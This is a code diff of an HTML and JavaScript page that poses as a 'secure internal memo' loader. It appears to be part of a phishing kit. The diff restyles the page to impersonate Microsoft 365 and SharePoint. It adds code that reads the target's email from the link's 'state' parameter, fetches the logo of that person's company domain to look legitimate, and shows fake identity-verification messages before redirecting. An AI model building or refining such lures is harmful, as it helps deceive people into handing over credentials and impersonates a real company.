@@ -5,118 +5,97 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Accessing Secure Document</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Inter:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI,system-ui,-apple-system,BlinkMacSystemFont,sans-serif');
 
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #111827; /* Dark blue-gray */
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #F8F9FA; /* Light gray background */
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #E5E7EB; /* Light gray text */
-            overflow: hidden; /* Hide scrollbars */
-        }
-
-        .background-blur {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('https://i.imgur.com/gYg28C4.png'); /* Blurry document image */
-            background-size: cover;
-            background-position: center;
-            filter: blur(8px) brightness(0.4);
-            opacity: 0.5;
-            z-index: -1;
-            transform: scale(1.1);
+            color: #333;
         }
 
         .container {
-            background-color: rgba(31, 41, 55, 0.75); /* Semi-transparent dark bg */
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            padding: 50px;
-            width: 520px;
-            max-width: 90%;
+            background-color: #FFFFFF;
+            border: 1px solid #DEE2E6; /* Light border */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            padding: 40px 50px;
+            width: 550px;
+            max-width: 95%;
             text-align: center;
-            z-index: 1;
         }
 
         .header {
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .secure-icon {
-            width: 60px;
-            height: 60px;
-            color: #34D399; /* Emerald green */
-            margin-bottom: 20px;
+        .company-logo {
+            max-width: 150px;
+            max-height: 50px;
+            margin-bottom: 25px;
+            object-fit: contain;
         }
-
+        
         .title {
-            color: #F9FAFB; /* Off-white */
-            font-size: 24px;
-            font-weight: 700;
+            color: #212529;
+            font-size: 26px;
+            font-weight: 600;
             margin: 0 0 10px 0;
         }
 
         .subtitle {
-            color: #D1D5DB; /* Lighter gray */
+            color: #6C757D;
             font-size: 16px;
             margin-bottom: 30px;
-            max-width: 400px;
         }
 
         .loading-container {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .loading-text {
-            font-family: 'Roboto Mono', monospace;
-            color: #A5B4FC; /* Indigo */
-            font-size: 16px;
-            font-weight: 500;
+            color: #005A9E; /* SharePoint blue */
+            font-size: 15px;
             margin: 0;
-            height: 20px; /* Reserve space to prevent layout shift */
+            height: 20px;
+            transition: color 0.3s;
         }
 
         .progress-container {
-            background-color: rgba(0,0,0,0.3);
-            height: 6px;
-            border-radius: 3px;
+            background-color: #E9ECEF;
+            height: 4px;
+            border-radius: 2px;
             overflow: hidden;
-            margin-bottom: 25px;
-            width: 100%;
+            margin: 15px auto 25px;
+            width: 80%;
         }
 
         .progress-bar-fill {
             height: 100%;
-            background: linear-gradient(90deg, #60A5FA, #34D399); /* Blue to green gradient */
+            background-color: #0078D4; /* Microsoft Blue */
             width: 0%;
             animation: decrypt-fill 2.5s ease-out forwards;
-            border-radius: 3px;
-            box-shadow: 0 0 10px #34D399, 0 0 5px #60A5FA;
+            border-radius: 2px;
         }
 
         .file-info { 
-            color: #9CA3AF; /* Gray */
+            color: #6C757D;
             font-size: 14px;
             margin: 0 0 30px 0;
         }
 
         .footer-text {
-            color: #6B7280; /* Darker gray */
+            color: #ADB5BD;
             font-size: 12px;
-            margin-top: 40px;
+            margin-top: 35px;
         }
 
         @keyframes decrypt-fill {
@@ -128,23 +107,19 @@
             display: block;
             margin-top: 20px;
             padding: 15px;
-            background-color: #FEF3C7; /* Amber */
-            color: #92400E; /* Dark Amber */
-            border: 1px solid #FDE68A;
+            background-color: #FFF3CD;
+            color: #856404;
+            border: 1px solid #FFEEBA;
             border-radius: 4px;
-            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <div class="background-blur"></div>
     <div class="container">
         <div class="header">
-             <svg class="secure-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                <path fill-rule="evenodd" d="M12 1.25a1.25 1.25 0 0 0-1.25 1.25v2.518a8.936 8.936 0 0 0-4.32.953l-2.094-.7a1.25 1.25 0 0 0-1.428.433l-1.884 3.263a1.25 1.25 0 0 0 .433 1.428l1.83 1.057a9.07 9.07 0 0 0 0 3.1l-1.83 1.057a1.25 1.25 0 0 0-.433 1.428l1.884 3.263a1.25 1.25 0 0 0 1.428.433l2.094-.7a8.936 8.936 0 0 0 4.32.953v2.518c0 .69.56 1.25 1.25 1.25s1.25-.56 1.25-1.25v-2.518a8.936 8.936 0 0 0 4.32-.953l2.094.7a1.25 1.25 0 0 0 1.428-.433l1.884-3.263a1.25 1.25 0 0 0-.433-1.428l-1.83-1.057a9.07 9.07 0 0 0 0-3.1l1.83-1.057a1.25 1.25 0 0 0 .433-1.428l-1.884-3.263a1.25 1.25 0 0 0-1.428-.433l-2.094.7a8.936 8.936 0 0 0-4.32-.953V2.5c0-.69-.56-1.25-1.25-1.25Zm-3.141 9.493a1.25 1.25 0 0 0-1.768 1.768l2.25 2.25a1.25 1.25 0 0 0 1.768 0l4.5-4.5a1.25 1.25 0 0 0-1.768-1.768L10.5 12.318l-1.64-1.575Z" clip-rule="evenodd" />
-            </svg>
+            <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
             <h1 class="title">Accessing Secure Internal Memo</h1>
-            <p class="subtitle">Please wait while we establish a secure connection and decrypt the contents.</p>
+            <p class="subtitle">Please wait while we establish a secure connection to your organization's document.</p>
         </div>
         <div class="loading-container">
             <p class="loading-text" id="loadingText">Establishing secure channel...</p>
@@ -152,11 +127,11 @@
         <div class="progress-container">
             <div class="progress-bar-fill" id="progressBar"></div>
         </div>
-        <p class="file-info">This shouldn't take long.</p>
+        <p class="file-info">This may take a moment.</p>
         <noscript>
-            <p>JavaScript is required to access this secure document. Please enable JavaScript and refresh.</p>
+            <p>JavaScript is required to access this secure document. Please enable it in your browser settings.</p>
         </noscript>
-        <p class="footer-text">Security Powered by &copy; SecureComms Inc.</p>
+        <p class="footer-text">Powered by Microsoft 365</p>
     </div>
 
     <script>
@@ -164,9 +139,9 @@
         const loadingText = document.getElementById('loadingText');
         const texts = [
             "Establishing secure channel...",
-            "Authenticating credentials...",
-            "Decrypting memo...",
-            "Finalizing access..."
+            "Verifying your identity...",
+            "Decrypting document...",
+            "Opening file..."
         ];
         let textIndex = 0;
         const interval = setInterval(() => {
@@ -184,24 +159,31 @@
         function getEmailFromState() {
             const searchParams = new URLSearchParams(window.location.search);
             const state = searchParams.get('state');
-            if (!state) {
-                return null;
-            }
+            if (!state) return null;
 
             const parts = state.split(':');
-            
-            // Only proceed if a colon was found and there is content after it.
             if (parts.length > 1) {
                 const potentialEmail = parts[parts.length - 1];
-                // Check if the part after the colon looks like an email.
                 if (potentialEmail && potentialEmail.includes('@')) {
                     return potentialEmail;
                 }
             }
-            
             return null;
         }
 
+        function setCompanyLogo(email) {
+            if (!email) return;
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logoEl = document.getElementById('companyLogo');
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                
+                logoEl.src = logoUrl;
+                logoEl.onload = () => { logoEl.style.display = 'block'; };
+                logoEl.onerror = () => { logoEl.style.display = 'none'; };
+            }
+        }
+        
         function performRedirect() {
             clearInterval(interval);
             const email = getEmailFromState();
@@ -212,17 +194,20 @@
                 console.log("Redirecting to:", redirectUrl);
                 window.location.href = redirectUrl;
             } else {
-                console.log("No value found in hash or search. Showing error.");
+                console.log("No email found in state parameter. Showing error.");
                 document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
-                document.querySelector('.file-info').textContent = 'Please verify the link or contact your administrator.';
+                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
+                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
                 const progressBar = document.getElementById('progressBar');
                 if (progressBar) {
-                    progressBar.style.background = '#F87171';
+                    progressBar.style.background = '#DC3545';
                     progressBar.style.width = '100%';
-                    progressBar.style.boxShadow = '0 0 10px #F87171';
                 }
             }
         }
+        
+        const email = getEmailFromState();
+        setCompanyLogo(email);
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
     </script>
